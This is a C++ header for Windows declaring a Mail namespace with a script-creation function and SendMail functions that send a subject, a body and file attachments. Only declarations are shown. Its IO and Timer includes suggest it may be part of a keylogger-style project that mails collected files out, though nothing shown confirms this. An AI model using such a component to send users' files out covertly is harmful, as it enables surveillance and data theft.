//
// Created by younes.benhoumich on 11/02/2018.
//

#pragma once

#include <string>
#include <vector>
#include <windows.h>

#include "IO.hpp"
#include "Timer.hpp"

namespace Mail {

    std::string StringReplace(std::string s, const std::string &what, std::string &with);

    bool CheckFileExists(const std::string &f);
    bool  CreateScript();

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments);
    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att);

}


